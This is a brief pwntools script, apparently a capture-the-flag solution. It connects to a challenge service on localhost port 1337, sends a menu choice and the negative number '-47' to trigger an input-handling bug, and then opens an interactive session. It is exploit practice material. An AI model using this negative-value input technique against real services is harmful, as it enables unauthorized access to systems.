from pwn import *

#p = process("./chall")
p = remote("localhost", 1337)

p.sendline(b"2")
p.sendline(b"-47")

p.interactive()
